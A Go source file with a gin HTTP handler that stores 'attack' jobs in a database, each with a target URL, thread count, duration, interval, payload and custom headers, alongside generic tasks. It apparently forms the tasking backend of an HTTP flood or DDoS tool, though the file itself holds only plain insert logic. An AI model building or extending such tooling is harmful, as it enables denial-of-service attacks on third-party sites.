package task

import (
	"net/http"

	"github.com/gin-gonic/gin"
	"wyvern.pw/data"
)

func CreateTask(c *gin.Context) {
	taskType := c.Query("type")
	switch taskType {
	case "attack":
		var attack Attack
		err := c.BindJSON(&attack)
		if err != nil {
			c.JSON(http.StatusOK, Response{
				Code:    http.StatusInternalServerError,
				Message: err.Error(),
			})
			c.Abort()
			return
		}
		err = createAttack(attack)
		if err != nil {
			c.JSON(http.StatusOK, Response{
				Code:    http.StatusInternalServerError,
				Message: err.Error(),
			})
			c.Abort()
			return
		}
		c.JSON(http.StatusOK, Response{
			Code:    http.StatusOK,
			Message: "The task was created successfully.",
		})
		c.Abort()
		return
	case "task":
		var task Task
		err := c.BindJSON(&task)
		if err != nil {
			c.JSON(http.StatusOK, Response{
				Code:    http.StatusInternalServerError,
				Message: err.Error(),
			})
			c.Abort()
			return
		}
		err = createTask(task)
		if err != nil {
			c.JSON(http.StatusOK, Response{
				Code:    http.StatusInternalServerError,
				Message: err.Error(),
			})
			c.Abort()
			return
		}
		c.JSON(http.StatusOK, Response{
			Code:    http.StatusOK,
			Message: "The task was created successfully.",
		})
		c.Abort()
		return
	default:
		c.JSON(http.StatusOK, Response{
			Code:    http.StatusBadRequest,
			Message: "Wrong task type.",
		})
		c.Abort()
		return
	}
}

func createAttack(attack Attack) error {
	db, err := data.GetConnection()
	if err != nil {
		return err
	}
	_, err = db.Exec("INSERT INTO attack(attack_type, method, target_url, thread, duration, interval, data, accept, accept_encoding, accept_language, user_agent, custom_header, target_execution, current_execution) VALUES($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13, $14)",
		attack.AttackType, attack.Method, attack.TargetURL, attack.Thread,
		attack.Duration, attack.Interval, attack.Data, attack.Accept,
		attack.AcceptEncoding, attack.AcceptLanguage, attack.UserAgent, attack.CustomHeader,
		attack.TargetExecution, 0)
	return err
}

func createTask(task Task) error {
	db, err := data.GetConnection()
	if err != nil {
		return err
	}
	_, err = db.Exec("INSERT INTO task(task_type, parameter, target_execution, current_execution) VALUES($1, $2, $3, $4)",
		task.TaskType, task.Parameter, task.TargetExecution, 0)
	return err
}
